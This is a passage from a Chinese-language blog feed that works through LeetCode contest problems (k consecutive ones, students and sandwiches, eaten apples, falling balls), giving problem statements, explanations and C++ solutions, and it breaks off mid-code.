class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>], k = <span class="number">2</span></span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：在第一次操作时，nums 可以变成 [<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>] 得到连续两个 <span class="number">1</span> 。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>], k = <span class="number">3</span></span><br><span class="line">输出：<span class="number">5</span></span><br><span class="line">解释：通过 <span class="number">5</span> 次操作，最左边的 <span class="number">1</span> 可以移到右边直到 nums 变为 [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>] 。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>], k = <span class="number">2</span></span><br><span class="line">输出：<span class="number">0</span></span><br><span class="line">解释：nums 已经有连续 <span class="number">2</span> 个 <span class="number">1</span> 了。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= nums.length &lt;= 105</code></li><li><code>nums[i]</code> 要么是 0 ，要么是 1 。</li><li><code>1 &lt;= k &lt;= sum(nums)</code></li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/minimum-adjacent-swaps-for-k-consecutive-ones" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-adjacent-swaps-for-k-consecutive-ones</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 前缀和 + 滑动窗口</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>我们直到肯定时将最近的<code>k</code>个<code>1</code>的位置进行合并即可，我们设当前最近的<code>k</code>个<code>1</code>的位置为:$p_{0},p_{1},…,p_{k-1}$,我们假设最终合并后的目标位置为$x,x+1,x+2,…,x+k-1$,本题也即相当于将数列变换为等差数列的最小交换次数.我们此时可以求出需要的交换次数为:<script type="math/tex; mode=display">steps = \sum_{i=0}^{k-1}|p_{i}-(x+i)| \\= \sum_{i=0}^{k-1}|(p_{i}-i)-x|</script>此时我们设$q_{i} = p_{i} - x$,则上述等式变换为:<script type="math/tex; mode=display">steps = \sum_{i=0}^{k-1}|q_{i}-x|</script>我们直到上述等式，当$x = median(q)$时，所求得和最小。所以我们可以直到如下：<script type="math/tex; mode=display">median(q_{i}) = \frac{q_{\frac{k-1}{2}}+q_{\frac{k}{2}}}{2} \\min(steps) = \sum_{i=0}^{k-1}|q_{i}-median(q)| \\= \sum_{i=0}^{\frac{k-1}{2}}(median(q)-q_{i}) + \sum_{i=\frac{k}{2}}^{k-1}(q_{i}-(median(q)) \\= \sum_{i=\frac{k}{2}}^{k-1}(q_{i}) - \sum_{i=0}^{\frac{k-1}{2}}(q_{i})  \\= \sum_{i=\frac{k}{2}}^{k-1}(p_{i}-i) - \sum_{i=0}^{\frac{k-1}{2}}(p_{i}-i) \\= \sum_{i=\frac{k}{2}}^{k-1}(p_{i}) - \sum_{i=0}^{\frac{k-1}{2}}(p_{i}) + \sum_{i=0}^{\frac{k-1}{2}}(i) - \sum_{i=\frac{k}{2}}^{k-1}(i)</script></li><li>题目本质上还是数学题目，特别是对于中位数的应用，应该非常熟悉这个类型的题目，相似的题目已经见过两次了一次是在<a href="https://leetcode-cn.com/contest/season/2020-fall/problems/5TxKeK/" target="_blank" rel="noopener">lcp</a>,google kickstart都遇到过类似的题目。<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minMoves</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = nums.size();</span><br><span class="line">        <span class="keyword">int</span> ans = INT_MAX;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt; sum(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] == <span class="number">1</span>)&#123;</span><br><span class="line">                arr.push_back(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.size(); ++i)&#123;</span><br><span class="line">            sum.push_back(sum[i] + arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.size()-k+<span class="number">1</span>; ++i)&#123;</span><br><span class="line">            <span class="keyword">int</span> l1 = (k<span class="number">-1</span>)/<span class="number">2</span> + i;</span><br><span class="line">            <span class="keyword">int</span> l2 = k/<span class="number">2</span> + i;</span><br><span class="line">            <span class="keyword">int</span> curr = (sum[i+k] - sum[l2]) - (sum[l1+<span class="number">1</span>]-sum[i]);</span><br><span class="line">            ans = min(ans,curr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(k%<span class="number">2</span> == <span class="number">0</span>) ans -= (k/<span class="number">2</span>)*(k/<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>(k%<span class="number">2</span> == <span class="number">1</span>) ans -= (k/<span class="number">2</span>+<span class="number">1</span>)*(k/<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-biweekly-contest-42&quot;&gt;&lt;a href=&quot;#leetcode-biweekly-contest-42&quot; class=&quot;headerlink&quot; title=&quot;leetcode  biweekly contest 42&quot;&gt;&lt;/a&gt;leetcode  biweekly contest 42&lt;/h1&gt;&lt;p&gt;双周赛的题目看似题目很简单，但是难度还是不小。&lt;/p&gt;&lt;h2 id=&quot;5621-无法吃午餐的学生数量&quot;&gt;&lt;a href=&quot;#5621-无法吃午餐的学生数量&quot; class=&quot;headerlink&quot; title=&quot;5621. 无法吃午餐的学生数量&quot;&gt;&lt;/a&gt;5621. 无法吃午餐的学生数量&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;学校的自助午餐提供圆形和方形的三明治，分别用数字 &lt;code&gt;0&lt;/code&gt;和 &lt;code&gt;1&lt;/code&gt; 表示。所有学生站在一个队列里，每个学生要么喜欢圆形的要么喜欢方形的。&lt;br&gt;餐厅里三明治的数量与学生的数量相同。所有三明治都放在一个 栈 里，每一轮：&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】  Contest 221</title>
    <link href="http://yoursite.com/2020/12/27/237/"/>
    <id>http://yoursite.com/2020/12/27/237/</id>
    <published>2020-12-27T13:27:48.728Z</published>
    <updated>2020-12-29T14:43:04.425Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-contest-221"><a href="#leetcode-contest-221" class="headerlink" title="leetcode  contest 221"></a>leetcode  contest 221</h1><p>本周的题目整体难度非常不错，刚好适合用于面试，最后一题确实是非常有意思的题目，虽然没有做出来，但是感觉这个题目出的相当不错。</p><h2 id="5621-无法吃午餐的学生数量"><a href="#5621-无法吃午餐的学生数量" class="headerlink" title="5621. 无法吃午餐的学生数量"></a>5621. 无法吃午餐的学生数量</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>学校的自助午餐提供圆形和方形的三明治，分别用数字 <code>0</code>和 <code>1</code> 表示。所有学生站在一个队列里，每个学生要么喜欢圆形的要么喜欢方形的。<br>餐厅里三明治的数量与学生的数量相同。所有三明治都放在一个 栈 里，每一轮：</p><a id="more"></a><ul><li>如果队列最前面的学生 喜欢 栈顶的三明治，那么会 拿走它 并离开队列。</li><li>否则，这名学生会 放弃这个三明治 并回到队列的尾部。<br>这个过程会一直持续到队列里所有学生都不喜欢栈顶的三明治为止。</li></ul><p>给你两个整数数组 <code>students</code> 和 <code>sandwiches</code> ，其中 <code>sandwiches[i]</code>是栈里面第 i​​​​​​ 个三明治的类型（i = 0 是栈的顶部）， <code>students[j]</code>是初始队列里第 j​​​​​​ 名学生对三明治的喜好（j = 0 是队列的最开始位置）。请你返回无法吃午餐的学生数量。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">输入：students = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>], sandwiches = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="number">0</span> </span><br><span class="line">解释：</span><br><span class="line">- 最前面的学生放弃最顶上的三明治，并回到队列的末尾，学生队列变为 students = [<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>]。</span><br><span class="line">- 最前面的学生放弃最顶上的三明治，并回到队列的末尾，学生队列变为 students = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>]。</span><br><span class="line">- 最前面的学生拿走最顶上的三明治，剩余学生队列为 students = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>]，三明治栈为 sandwiches = [<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>]。</span><br><span class="line">- 最前面的学生放弃最顶上的三明治，并回到队列的末尾，学生队列变为 students = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>]。</span><br><span class="line">- 最前面的学生拿走最顶上的三明治，剩余学生队列为 students = [<span class="number">1</span>,<span class="number">0</span>]，三明治栈为 sandwiches = [<span class="number">0</span>,<span class="number">1</span>]。</span><br><span class="line">- 最前面的学生放弃最顶上的三明治，并回到队列的末尾，学生队列变为 students = [<span class="number">0</span>,<span class="number">1</span>]。</span><br><span class="line">- 最前面的学生拿走最顶上的三明治，剩余学生队列为 students = [<span class="number">1</span>]，三明治栈为 sandwiches = [<span class="number">1</span>]。</span><br><span class="line">- 最前面的学生拿走最顶上的三明治，剩余学生队列为 students = []，三明治栈为 sandwiches = []。</span><br><span class="line">所以所有学生都有三明治吃。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：students = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>], sandwiches = [<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="number">3</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= students.length, sandwiches.length &lt;= 100</code></li><li><code>students.length == sandwiches.length</code></li><li><code>sandwiches[i]</code> 要么是 0 ，要么是 1 。</li><li><code>students[i]</code>要么是 0 ，要么是 1 。</li></ul><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/number-of-students-unable-to-eat-lunch" target="_blank" rel="noopener">https://leetcode-cn.com/problems/number-of-students-unable-to-eat-lunch</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  直接用队列模拟</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>简单题目，因为题目的复杂度很低，所以我们直接用队列模拟即可，非常加单。</li><li>变换一种思路来看，学生的队列无论如何变换，如果当前剩余的学生中只有存在当前栈顶的元素，则学生一定能够取走栈顶的元素，所以我们只需要每次对栈顶的元素减<code>1</code>操作即可，直到当前栈顶的元素没有则返回剩余的学生的数目。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countStudents</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; students, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; sandwiches)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; cnt(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : students)&#123;</span><br><span class="line">            cnt[v]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : sandwiches)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cnt[v] &gt; <span class="number">0</span>) cnt[v]--;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cnt[<span class="number">0</span>] + cnt[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5638-吃苹果的最大数目"><a href="#5638-吃苹果的最大数目" class="headerlink" title="5638. 吃苹果的最大数目"></a>5638. 吃苹果的最大数目</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>有一棵特殊的苹果树，一连 n 天，每天都可以长出若干个苹果。在第 i 天，树上会长出 <code>apples[i]</code> 个苹果，这些苹果将会在 days[i] 天后（也就是说，第 <code>i + days[i]</code> 天时）腐烂，变得无法食用。也可能有那么几天，树上不会长出新的苹果，此时用 <code>apples[i] == 0</code>且 <code>days[i] == 0</code>表示。</p><p>你打算每天 最多 吃一个苹果来保证营养均衡。注意，你可以在这 n 天之后继续吃苹果。</p><p>给你两个长度为 n 的整数数组 <code>days</code> 和 <code>apples</code>，返回你可以吃掉的苹果的最大数目。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：apples = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">2</span>], days = [<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>]</span><br><span class="line">输出：<span class="number">7</span></span><br><span class="line">解释：你可以吃掉 <span class="number">7</span> 个苹果：</span><br><span class="line">- 第一天，你吃掉第一天长出来的苹果。</span><br><span class="line">- 第二天，你吃掉一个第二天长出来的苹果。</span><br><span class="line">- 第三天，你吃掉一个第二天长出来的苹果。过了这一天，第三天长出来的苹果就已经腐烂了。</span><br><span class="line">- 第四天到第七天，你吃的都是第四天长出来的苹果。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：apples = [<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>], days = [<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>]</span><br><span class="line">输出：<span class="number">5</span></span><br><span class="line">解释：你可以吃掉 <span class="number">5</span> 个苹果：</span><br><span class="line">- 第一天到第三天，你吃的都是第一天长出来的苹果。</span><br><span class="line">- 第四天和第五天不吃苹果。</span><br><span class="line">- 第六天和第七天，你吃的都是第六天长出来的苹果。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>apples.length == n</code></li><li><code>days.length == n</code></li><li><code>1 &lt;= n &lt;= 2 * 104</code></li><li><code>0 &lt;= apples[i], days[i] &lt;= 2 * 104</code></li><li>只有在 <code>apples[i] = 0</code>时，<code>days[i] = 0</code>才成立</li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/maximum-number-of-eaten-apples" target="_blank" rel="noopener">https://leetcode-cn.com/problems/maximum-number-of-eaten-apples</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 贪心算法</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>类似于贪心算法的滑动窗口，首先我们处理前<code>n</code>天的记录。我们每次记录第<code>i</code>天之前可以吃的苹果数目，每次到达第<code>i</code>天时，我们首先将全部已经过期的数据全部去掉。然后将可以吃的数据将<code>1</code>，直到其为<code>0</code>;</li><li>第<code>i</code>天以后的数据因为没有再增加的数据，所以我们只用取到第<code>n</code>天的可以吃的最大数据即可。<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">eatenApples</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; B)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = A.size();</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; cnt;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(A[i] &gt; <span class="number">0</span>) cnt[i+B[i]] += A[i];</span><br><span class="line">            <span class="keyword">while</span>(!cnt.empty() &amp;&amp; cnt.begin()-&gt;first &lt;= i)&#123;</span><br><span class="line">                cnt.erase(cnt.begin()-&gt;first);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!cnt.empty())&#123;</span><br><span class="line">                <span class="keyword">int</span> x = cnt.begin()-&gt;first;</span><br><span class="line">                ans++;</span><br><span class="line">                cnt[x]--;</span><br><span class="line">                <span class="keyword">if</span>(cnt[x] == <span class="number">0</span>) cnt.erase(x);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> curr = n;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : cnt)&#123;</span><br><span class="line">            <span class="keyword">int</span> days = v.first - curr;</span><br><span class="line">            ans += min(days,v.second);</span><br><span class="line">            curr = v.first;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5210-球会落何处"><a href="#5210-球会落何处" class="headerlink" title="5210. 球会落何处"></a>5210. 球会落何处</h2><p>用一个大小为 m x n 的二维网格 grid 表示一个箱子。你有 n 颗球。箱子的顶部和底部都是开着的。</p><p>箱子中的每个单元格都有一个对角线挡板，跨过单元格的两个角，可以将球导向左侧或者右侧。</p><ul><li>将球导向右侧的挡板跨过左上角和右下角，在网格中用 1 表示。</li><li>将球导向左侧的挡板跨过右上角和左下角，在网格中用 -1 表示。<br>在箱子每一列的顶端各放一颗球。每颗球都可能卡在箱子里或从底部掉出来。如果球恰好卡在两块挡板之间的 “V” 形图案，或者被一块挡导向到箱子的任意一侧边上，就会卡住。</li></ul><p>返回一个大小为 n 的数组 answer ，其中 answer[i] 是球放在顶部的第 i 列后从底部掉出来的那一列对应的下标，如果球卡在盒子里，则返回 -1 。</p><p>示例 1：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：grid = [[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>],[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>],[<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>],[<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>]]</span><br><span class="line">输出：[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>]</span><br><span class="line">解释：示例如图：</span><br><span class="line">b0 球开始放在第 <span class="number">0</span> 列上，最终从箱子底部第 <span class="number">1</span> 列掉出。</span><br><span class="line">b1 球开始放在第 <span class="number">1</span> 列上，会卡在第 <span class="number">2</span>、<span class="number">3</span> 列和第 <span class="number">1</span> 行之间的 <span class="string">"V"</span> 形里。</span><br><span class="line">b2 球开始放在第 <span class="number">2</span> 列上，会卡在第 <span class="number">2</span>、<span class="number">3</span> 列和第 <span class="number">0</span> 行之间的 <span class="string">"V"</span> 形里。</span><br><span class="line">b3 球开始放在第 <span class="number">3</span> 列上，会卡在第 <span class="number">2</span>、<span class="number">3</span> 列和第 <span class="number">0</span> 行之间的 <span class="string">"V"</span> 形里。</span><br><span class="line">b4 球开始放在第 <span class="number">4</span> 列上，会卡在第 <span class="number">2</span>、<span class="number">3</span> 列和第 <span class="number">1</span> 行之间的 <span class="string">"V"</span> 形里。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：grid = <span class="string">[[-1]]</span></span><br><span class="line">输出：[<span class="number">-1</span>]</span><br><span class="line">解释：球被卡在箱子左侧边上。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>m == grid.length</code></li><li><code>n == grid[i].length</code></li><li><code>1 &lt;= m, n &lt;= 100</code></li><li><code>grid[i][j] 为 1 或 -1</code></li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/where-will-the-ball-fall" target="_blank" rel="noopener">https://leetcode-cn.com/problems/where-will-the-ball-fall</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 直接模拟</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>题目比较怪异，但是整体来说比较简单，我们需要设定义个标志位，表示当前的球在挡板的上半部分还是下半部分，如果在挡板的下半部分，则球直接往下一行掉落，否则则根据挡板的样式，向左或者向右滑动即可。<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; findBall(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; grid) &#123;</span><br><span class="line">        <span class="keyword">int</span> row = grid.size();</span><br><span class="line">        <span class="keyword">int</span> col = grid[<span class="number">0</span>].size();</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans(col,<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; col; ++i)&#123;</span><br><span class="line">            <span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> y = i;</span><br><span class="line">            <span class="keyword">int</span> t = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(x &lt; row)&#123;</span><br><span class="line">                <span class="keyword">if</span>(t == <span class="number">0</span>)&#123;</span><br><span class="line">                    x++;</span><br><span class="line">                    t = <span class="number">1</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">if</span>(grid[x][y] == <span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(y+<span class="number">1</span> == col)&#123;</span><br><span class="line">                            ans[i] = <span class="number">-1</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        